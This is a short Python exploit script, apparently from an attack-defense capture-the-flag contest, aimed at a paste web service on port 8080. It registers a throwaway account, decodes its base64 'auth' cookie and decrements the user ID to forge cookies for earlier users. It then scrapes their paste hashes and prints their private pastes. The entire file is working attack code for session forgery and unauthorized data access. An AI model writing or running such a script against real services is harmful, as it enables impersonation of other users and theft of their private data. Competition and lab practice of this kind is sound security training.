#!/usr/bin/env python3

import requests as req
import sys, random, string
from base64 import b64encode, b64decode

host = sys.argv[1]

def generate_string(N):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))

try:
    s = req.Session()
    username = generate_string(16)
    pwd = generate_string(16)

    r = s.post("http://" + host + ":8080/auth", data={"username" : username, "pwd" : pwd})
    cookies = s.cookies.get_dict()
    user_token = b64decode(cookies["auth"]).decode('utf-8').split(':')
    try:
        for i in range(10):
            n_user_token = user_token[:]
            n_user_token[0] = str(int(n_user_token[0]) - i)
            n_user_token = ':'.join(n_user_token).encode('utf-8')
            n_user_token = str(b64encode(n_user_token))[2:-1]

            r = req.get("http://" + host + ":8080/", cookies={'auth' : n_user_token})

            start_ind = str(r.content).index('href="') + 13
            file_hash = str(r.content)[start_ind:start_ind+40]
            r = req.get("http://" + host + ":8080/paste/" + file_hash, timeout=5)
            print(r.text, flush=True)
    except Exception as e:
        print(e, flush=True)
except req.exceptions.Timeout:
    print("Timeout", flush=True)
except Exception as e:
    print(e, flush=True)

